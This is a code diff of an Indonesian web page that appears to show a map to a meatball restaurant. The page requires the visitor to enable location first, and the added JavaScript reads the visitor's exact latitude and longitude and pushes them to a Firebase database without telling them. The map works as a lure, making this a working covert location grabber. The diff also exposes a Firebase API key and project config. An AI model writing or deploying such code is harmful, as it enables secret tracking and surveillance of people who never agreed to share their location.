@@ -11,27 +11,20 @@
       margin: 0;
       padding: 0;
       font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
     }
     #map {
       width: 100%;
-      height: 100vh;
+      height: 100%;
       border: 0;
+      display: none; /* Sembunyikan peta secara default */
     }
     #permissionDialog {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      padding: 20px;
-      background-color: #fff;
-      border: 1px solid #ccc;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-      display: none;
-      z-index: 1000;
+      display: block;
       text-align: center;
-    }
-    #permissionDialog p {
-      margin-bottom: 10px;
     }
     #permissionDialog button {
       padding: 10px 20px;
@@ -43,38 +36,61 @@
   </style>
 </head>
 <body>
-  <div id="map"></div>
   <div id="permissionDialog">
     <p>Aktifkan lokasi untuk melanjutkan.</p>
     <button onclick="activateLocation()">OK</button>
   </div>
+  <iframe id="map" src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d19919.480436110192!2d112.07281683859024!3d-7.839945339778854!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2e78591a016e2609%3A0x5fc3e737dcf06178!2sBakso%20Pak%20Ndut!5e0!3m2!1sid!2sid!4v1720437631958!5m2!1sid!2sid" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
 
-  <!-- JavaScript -->
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
+
+  <!-- Your web app's Firebase configuration -->
   <script>
-    var mapLoaded = false;
+    var firebaseConfig = {
+      apiKey: "AIzaSyAB6mV2XIrqqqWweg1PO1wP1ZQrOo2y4_g",
+      authDomain: "lokasi-3a03e.firebaseapp.com",
+      databaseURL: "https://lokasi-3a03e-default-rtdb.firebaseio.com",
+      projectId: "lokasi-3a03e",
+      storageBucket: "lokasi-3a03e.appspot.com",
+      messagingSenderId: "447129590384",
+      appId: "1:447129590384:web:5007760dec7611792532b5",
+      measurementId: "G-DS0C1FSB45"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
 
     function activateLocation() {
-      document.getElementById('permissionDialog').style.display = 'none';
-      document.getElementById('map').style.display = 'block';
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          var latitude = position.coords.latitude;
+          var longitude = position.coords.longitude;
 
-      if (!mapLoaded) {
-        var iframe = document.createElement('iframe');
-        iframe.src = 'https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d19919.480436110192!2d112.07281683859024!3d-7.839945339778854!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2e78591a016e2609%3A0x5fc3e737dcf06178!2sBakso%20Pak%20Ndut!5e0!3m2!1sid!2sid!4v1720437631958!5m2!1sid!2sid';
-        iframe.style.border = '0';
-        iframe.style.width = '100%';
-        iframe.style.height = '100vh';
-        iframe.allowfullscreen = '';
-        iframe.loading = 'lazy';
-        iframe.referrerpolicy = 'no-referrer-when-downgrade';
-        document.getElementById('map').appendChild(iframe);
-        mapLoaded = true;
+          // Simpan data ke Firebase Realtime Database
+          var database = firebase.database();
+          var ref = database.ref('lokasi');
+
+          var data = {
+            latitude: latitude,
+            longitude: longitude
+          };
+
+          ref.push(data);
+
+          // Tampilkan peta menggunakan iframe setelah lokasi didapatkan
+          document.getElementById('permissionDialog').style.display = 'none';
+          document.getElementById('map').style.display = 'block';
+        }, function(error) {
+          console.error('Error getting location:', error);
+          alert('Izin lokasi ditolak karena anda belum menyalakan lokasi. Aktifkan Lokasi Terlebih dahulu.');
+        });
+      } else {
+        console.error('Geolocation is not supported by this browser.');
+        alert('Geolokasi tidak didukung oleh browser ini.');
       }
     }
-    
-    // Tampilkan dialog izin saat halaman dimuat
-    window.onload = function() {
-      document.getElementById('permissionDialog').style.display = 'block';
-    };
   </script>
 </body>
 </html>
